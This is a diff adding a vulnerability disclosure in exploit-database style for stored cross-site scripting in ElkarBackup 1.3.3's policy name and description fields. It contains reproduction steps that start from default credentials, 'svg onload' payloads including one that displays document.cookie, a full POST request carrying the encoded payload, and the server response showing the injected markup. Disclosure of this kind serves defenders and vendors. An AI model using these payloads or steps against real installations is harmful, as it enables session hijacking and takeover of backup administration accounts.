@@ -1,0 +1,46 @@
+# Exploit Title: ElkarBackup 1.3.3 - 'Policy[name]' and 'Policy[Description]' Stored Cross-site Scripting
+# Date: 2020-08-22
+# Exploit Author: Vyshnav NK
+# Vendor Homepage: https://www.elkarbackup.org/
+# Software Link: https://github.com/elkarbackup/elkarbackup/wiki/Installation
+# Version: 1.3.3
+# Tested on: Linux
+
+Reproduction Steps: 
+
+1 - Go to the elakarbackup/login
+2 - Login with default credentials
+3 - Go to Policies >> Action >> Edit any of the existing Policies >> Insert XSS Payload in Paramter "Policy[name] and Policy[Description]"
+4 - Click on Save 
+5 - We can see the Javacript Code executed Sucessfully 
+
+
+XSS Attack vectors :
+
+"><svg/onload=alert(4)>
+"><svg/onload=alert(document.cookie)>
+
+
+
+Request : 
+
+POST /policy/1 HTTP/1.1
+Host: ip172-18-0-31-bt0bt4iosm4g00dvca80-8000.direct.labs.play-with-docker.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1123
+Origin: http://ip172-18-0-31-bt0bt4iosm4g00dvca80-8000.direct.labs.play-with-docker.com
+Connection: close
+Referer: http://ip172-18-0-31-bt0bt4iosm4g00dvca80-8000.direct.labs.play-with-docker.com/policy/1?
+Cookie: PHPSESSID=03e0bcfa5864ffe758916b5e171c1505
+Upgrade-Insecure-Requests: 1
+
+Policy%5Bname%5D=%22%3E%3Csvg%2Fonload%3Dalert%284%29%3E&Policy%5Bdescription%5D=%22%3E%3Csvg%2Fonload%3Dalert%284%29%3E&Policy%5BhourlyHours%5D=12%3A00%7C15%3A00%7C21%3A00&Policy%5BhourlyDaysOfMonth%5D=&Policy%5BhourlyDaysOfWeek%5D=1%7C2%7C3%7C4%7C5&Policy%5BhourlyMonths%5D=&Policy%5BhourlyCount%5D=0&Policy%5BdailyHours%5D=21%3A00&Policy%5BdailyDaysOfMonth%5D=&Policy%5BdailyDaysOfWeek%5D=1%7C2%7C3%7C4%7C5&Policy%5BdailyMonths%5D=&Policy%5BdailyCount%5D=5&Policy%5BweeklyHours%5D=21%3A00&Policy%5BweeklyDaysOfMonth%5D=&Policy%5BweeklyDaysOfWeek%5D=1&Policy%5BweeklyMonths%5D=&Policy%5BweeklyCount%5D=4&Policy%5BmonthlyHours%5D=21%3A00&Policy%5BmonthlyDaysOfMonth%5D=1&Policy%5BmonthlyDaysOfWeek%5D=&Policy%5BmonthlyMonths%5D=&Policy%5BmonthlyCount%5D=12&Policy%5ByearlyHours%5D=21%3A00&Policy%5ByearlyDaysOfMonth%5D=&Policy%5ByearlyDaysOfWeek%5D=&Policy%5ByearlyMonths%5D=&Policy%5ByearlyCount%5D=0&Policy%5Bexclude%5D=%22%3E%3Csvg%2Fonload%3Dalert%284%29%3E&Policy%5Binclude%5D=%22%3E%3Csvg%2Fonload%3Dalert%284%29%3E&Policy%5BsyncFirst%5D=1&Policy%5B_token%5D=B6JELPCVSHiZrMvyEeeBdRMLYSKBWfUMUwBeLWw8XpI&weekly-day=on
+
+
+Response :
+
+<form data-bnv-message="Really delete policy "><svg/onload=alert(4)>?" class="delete-policy" action="/policy/1/delete" method="POST" style="display:inline">
